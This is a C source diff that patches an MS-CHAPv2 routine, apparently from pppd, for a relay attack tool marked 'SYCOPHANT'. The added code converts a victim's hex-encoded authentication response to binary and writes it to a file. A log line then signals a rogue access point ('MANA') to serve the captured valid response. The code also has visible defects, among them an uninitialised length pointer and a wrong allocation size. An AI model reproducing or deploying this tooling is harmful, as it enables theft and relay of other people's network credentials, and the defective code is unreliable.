@@ -410,6 +410,35 @@ chapms2_make_response(unsigned char *response, int id, char *our_name,
 	chapms2_add_to_response_cache(id, challenge, response, auth_response);
 }
 
+unsigned char *
+hex_str_to_bin_char(unsigned char *in, int *res_len) {
+
+    int in_len = strlen((char*)in);
+	info("SYCOPHANT CONVERTER String - %s\n",in); 
+	info("SYCOPHANT CONVERTER String Len - %d\n",in_len); 
+
+    int out_len = (in_len / 2) - 1;
+
+    unsigned char *out = calloc(out_len, sizeof(char *));
+
+    for (int i = 0, j = 2; j < in_len; ++i, j += 2) {
+        int val[1];
+        sscanf((char*)in + j, "%2x", val);
+        out[i] = val[0];
+    }
+
+    if (res_len != NULL) {
+        *res_len = out_len;
+    }
+
+	dbglog("SYCOPHANT : Conversion IN CONTENTS %.*B",
+	in_len, in);
+	dbglog("SYCOPHANT : Conversion OUT CONTENTS %.*B",
+	res_len, out);	
+
+    return out;
+}
+
 static int
 chapms2_check_success(int id, unsigned char *msg, int len)
 {
@@ -428,12 +457,32 @@ chapms2_check_success(int id, unsigned char *msg, int len)
 	if( validateFile == NULL )
 		printf("Open Error");
 
-	u_char line [20]; 
-	memcpy(line, msg, 20);
+	// unsigned char *msg
+	// unsigned char line [22]; 
+	// memcpy(line, msg, 22);
 
-	info("SYCOPHANT VALIDATE DATA CREATED BY VICTIM", line, 20);
- 	fwrite(line,20,1,validateFile); 
+	int * line_len;
+	unsigned char * line = hex_str_to_bin_char(msg, line_len);
+
+	dbglog("SYCOPHANT : Conversion FINAL CONTENTS %.*B",
+	20, line);
+
+ 	fwrite(line, 20,1,validateFile); 
 	fclose(validateFile);
+
+
+
+	// unsigned char line [MS_AUTH_RESPONSE_LENGTH]; 
+
+	// dbglog("SYCOPHANT Reading verification from file");
+	// validateFile = fopen(validateFileName, "r");
+	// fread(line, MS_AUTH_RESPONSE_LENGTH, 1, validateFile);
+
+	// info("SYCOPHANT VERIFICATION - %s\n",line); 
+	// dbglog("SYCOPHANT : VERIFICATION CONTENTS %.*B",
+	// 	20, line);
+
+
 	// Inform of our readyness
 	// char* outLockName = "CHALLENGE_LOCK";
 	info("SYCOPHANT INFORMING MANA TO SERVE VALID RESPONSE");
